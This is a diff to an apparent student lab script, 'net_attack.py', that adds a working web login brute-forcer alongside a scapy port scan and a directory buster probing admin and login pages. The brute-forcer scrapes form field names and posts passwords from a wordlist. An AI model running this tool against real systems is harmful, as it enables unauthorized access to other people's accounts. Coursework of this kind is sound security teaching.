@@ -5,6 +5,7 @@ import sys
 from scapy.all import ICMP, IP, sr1, TCP
 import socket
 import requests
+import time
 
 # Question 2: Connectivity
 
@@ -45,12 +46,12 @@ def scanPorts(target_ip, target_ports):
     print(f"{'Port':<8}{'Status':<12}{'Service'}") # Titles
     print("-" * 50)
 
-    ipHeader = IP(dst=target_ip)  
+    ip_header = IP(dst=target_ip)  
 
     for port in target_ports:
         # Create the TCP header with the port
-        tcpHeader = TCP(dport=port, )
-        packet = ipHeader / tcpHeader # Craft packet with both IP and TCP header
+        tcp_header = TCP(dport=port, )
+        packet = ip_header / tcp_header # Craft packet with both IP and TCP header
 
         # Send the packet and wait for a response
         response = sr1(packet, timeout=2, verbose=0)
@@ -126,34 +127,122 @@ def confirmHTTP(target_ip):
         print()
         return False    
     
+
+
+    
 # Question 5: Directory Busting
+
 def dirBuster(target_ip):
     print("\n[-] Starting directory busting for open port 80...")
     print("-" * 50)
+   
+    # Define the pages to be checked
     pages = [
         "login.php",
         "admin.php",
         "admin/login.php",
         "admin/admin.php",
-    ] # Defines the pages to be checked
+    ] 
 
+    # Iterates through these pages
     for page in pages:
-        url = f"http://{target_ip}/{page}" # Creates URL using target IP and checks for each page
+        url = f"http://{target_ip}/{page}" # Creates URL using target IP and checks with each page
+        
         try:
-            response = requests.get(url, timeout=5)
+            response = requests.get(url, timeout=5) # Using HTTP requests to find URLs
+            
             if response.status_code == 200: # Successful status code
-                print(f"[+] Accessible: {url}")
+                print(f"[+] Accessible Form: {url}")
                 if "<form" in response.text.lower(): # Checks if form is present
                     print(f"    [+] HTML form found on: {url}")
+                    bruteforceWeb(url, args.username, args.password_list) # Question 6 addition
                     print()
                 else:
                     print(f"    [-] No HTML form found on: {url}")
-                    print()
+                    
             else:
-                print(f"[-] Not accessible: {url} (Status Code: {response.status_code})")
+                print(f"[-] No accessible form: {url} (Status Code: {response.status_code})")
         except requests.RequestException as e:
             print(f"[-] Error accessing {url}: {e}")
     print()
+
+
+
+# Question 6: Bruteforce Web
+
+def bruteforceWeb(url, username, password_list_file):
+  
+    try:
+        # Checks if URL can be accessed
+        response = requests.get(url, timeout=5) # GET request
+        
+        if response.status_code != 200: # Not a HTTP ok status response
+            print(f"[-] Unable to access: {url}. Status Code: {response.status_code}")
+            return 
+        
+        html_content = response.text
+        form_fields = {}
+
+        # Look for all input fields in the HTML content
+        for line in html_content.splitlines():
+            line = line.strip().lower() 
+            
+            # Look for input fields with "name=" to find field values
+            if "name='" in line:
+                start_index = line.find("name='") + len("name='")
+                end_index = line.find("'", start_index)
+                
+                if start_index != -1 and end_index != -1:
+                    field_name = line[start_index:end_index]
+                    
+                    # Check if the field is related to username or password
+                    if 'username' in field_name or 'user' in field_name or 'email' in field_name:
+                        form_fields['username'] = field_name
+                    elif 'password' in field_name or 'pass' in field_name:
+                        form_fields['password'] = field_name
+
+
+        print(f"[+] Found form fields: {form_fields}")       
+
+        # Ensure both username and password fields were found
+        if 'username' not in form_fields or 'password' not in form_fields:
+            print("[-] Could not find both 'username' and 'password' fields.")
+            return
+
+        
+        # Check if the password list file exists
+        if not os.path.isfile(password_list_file):
+            print(f"[-] Password list file not found: {password_list_file}")
+            return
+        
+        with open(password_list_file, "r", encoding='utf-8', errors='ignore') as file: # Encoding line added
+            passwords = file.read().splitlines()  # Read passwords from the file
+        
+        print("\n[+] Starting brute-force attack...")
+        
+        # Iterates through the password list and attempts login with each password
+        for password in passwords:
+            data = {form_fields['username']: username, form_fields['password']: password}  # Prepares the POST data
+            
+            try:
+                # Send POST request with the current username/password combo
+                response = requests.post(url, data=data, timeout=5)
+                               
+                if "Welcome" in response.text: 
+                        print(f"[+] Login successful with username: '{username}' and password: '{password}'")
+                        return
+                else:
+                        print(f"[-] Failed login with password: '{password}'") 
+
+            except requests.RequestException as e:
+                print(f"[-] Error during request: {e}") # Error Handling
+        
+        print("[-] Brute force attack completed. No valid credentials found.") # Catch no credentials found e
+    
+    except requests.RequestException as e:
+        print(f"[-] Error accessing the web page: {e}") # Error Handling
+
+
 
 
 # Question 1: Argparse
@@ -161,6 +250,8 @@ def main():
     print("Credential Checker:") 
     print("-" * 50)       
     
+    global args # Allow all methods to access args
+
     parser = argparse.ArgumentParser(prog="net_attack.py", description="Read User Arguments"
                                      , epilog="Author: Orla Dolan",)
 
@@ -202,7 +293,7 @@ def main():
         sys.exit(1)
 
 
-    # Task 2: Connectivity Check
+    # Task 2 addition: Connectivity Check
     print("\n[+] Checking connectivity to the target IP...")
     print("-" * 50)
     if not checkConnectivity(args.target): # if false
@@ -212,7 +303,7 @@ def main():
         print(f"Success: Target {args.target} is reachable.")    
 
 
-    # Task 3: Scan Ports
+    # Task 3 addition: Scan Ports
     try:
         target_ports = [int(port.strip()) for port in args.port.split(",")]
     except ValueError:
@@ -231,3 +322,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+        
